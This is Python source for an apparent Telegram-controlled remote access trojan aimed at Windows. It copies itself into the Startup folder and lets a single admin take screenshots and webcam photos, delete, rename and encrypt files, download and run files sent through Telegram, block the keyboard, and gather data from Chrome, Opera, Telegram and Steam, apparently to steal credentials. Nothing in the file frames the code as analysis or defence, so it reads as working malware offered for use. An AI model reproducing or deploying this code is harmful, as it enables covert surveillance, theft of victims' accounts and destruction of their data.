from aiogram import Bot, Dispatcher, executor, types
from aiogram.types.message import ContentType
from config import *
from keyboards.main import *
from functions.System import *
from functions.index import *
from logs.chrome import *
from logs.opera import *
from logs.telegram import *
from logs.steam import *

bot = Bot(token=token)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

Thisfile = sys.argv[0]
Thisfile_name = os.path.basename(Thisfile)
user_path = os.path.expanduser('~')

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')

while True:
    try:
        @dp.message_handler(commands=['start'])
        async def process_start_command(message: types.Message):
            if message.from_user.id == admin_id:
                await bot.send_message(message.from_user.id, "Вы можете воспользоваться кнопками, если нужна помощь. Введите /help", reply_markup=buttons)



        Screen(dp, bot, admin_id)
        Antiviruses(dp, bot, admin_id)
        Pc_info(dp, bot, admin_id)
        VolumeON(dp, bot, admin_id)
        VolumeOFF(dp, bot, admin_id)
        Shutdown(dp, bot, admin_id)
        Restart(dp, bot, admin_id)
        F4(dp, bot, admin_id)
        WinD(dp, bot, admin_id)
        GetDir(dp, bot, admin_id)
        ListDir(dp, bot, admin_id)
        Selfie(dp, bot, admin_id)
        Screamer(dp, bot, admin_id)
        Open_url(dp, bot, admin_id)
        MakeDir(dp, bot, admin_id)
        RmTree(dp, bot, admin_id)
        RmFile(dp, bot, admin_id)
        Rename(dp, bot, admin_id)
        Replace(dp, bot, admin_id)
        Msg(dp, bot, admin_id)
        Dwn(dp, bot, admin_id)
        Web(dp, bot, admin_id)
        Au(dp, bot, admin_id)
        Sys(dp, bot, admin_id)
        Mouse(dp, bot, admin_id)
        Wall(dp, bot, admin_id)
        ChangeDir(dp, bot, admin_id)
        Encrypt(dp, bot, admin_id)
        Decrypt(dp, bot, admin_id)
        BLkeyboard(dp, bot, admin_id)
        Get_size(dp, bot, admin_id)
        Telegram(dp, bot, admin_id)
        Chrome(dp, bot, admin_id)
        Opera(dp, bot, admin_id)
        Steam(dp, bot, admin_id)
        DWzip(dp, bot, admin_id)
        SeeEx(dp, bot, admin_id)
        ChEx(dp, bot, admin_id)
        ProcList(dp, bot, admin_id)
        ClosePG(dp, bot, admin_id)
        CloseTask(dp, bot, admin_id)
        SayHello(dp, bot, admin_id)
        Uninstall(dp, bot, admin_id)
        CMDBomb(dp, bot, admin_id)
        DVDOpen(dp, bot, admin_id)
        DVDClose(dp, bot, admin_id)
        Rotate(dp, bot, admin_id)
        WriteText(dp, bot, admin_id)

        @dp.message_handler(commands=['help'])
        async def process_start_command(message: types.Message):
            if message.from_user.id == admin_id:
                await bot.send_message(message.from_user.id, """<b>Прочти прежде чем использовать бота!!!</b>
<i>Если пропали кнопки, отправь боту /start либо /help
Функция блокировки клавиатуры работает криво после,
окончания блокировки клавиатуры, некоторые клавишы могу всё ещё не работать.</i>
""", reply_markup=buttons, parse_mode='HTML')
        
        @dp.message_handler(content_types=['document'])
        async def download(message: types.Message):
            if message.from_user.id == admin_id:
                try:
                    msg = await bot.send_message(message.from_user.id, "Скачиваю...")
                    file_id = message.document.file_id
                    file = await bot.get_file(file_id)
                    file_path = file.file_path
                    await bot.download_file(file_path, message.document.file_name)
                    await bot.edit_message_text('Успешно скачал ✅', admin_id, msg.message_id)
                except Exception as e:
                    await bot.send_message(admin_id, e)

        @dp.message_handler(content_types=['voice'])
        async def audio(message: types.Message):
            if message.from_user.id == admin_id:
                try:
                    msg = await bot.send_message(message.from_user.id, "Сейчас запущу...")
                    file_id = message.voice.file_id
                    file = await bot.get_file(file_id)
                    file_path = file.file_path
                    await bot.download_file(file_path, message.voice.file_unique_id + '.ogg')
                    os.system(message.voice.file_unique_id + '.ogg')
                    await bot.edit_message_text('Успешно запустил твоё голосовое сообщение ✅', admin_id, msg.message_id)
                except Exception as e:
                    await bot.send_message(admin_id, e)

        if __name__ == '__main__':
            executor.start_polling(dp, skip_updates = True)
    except:
        pass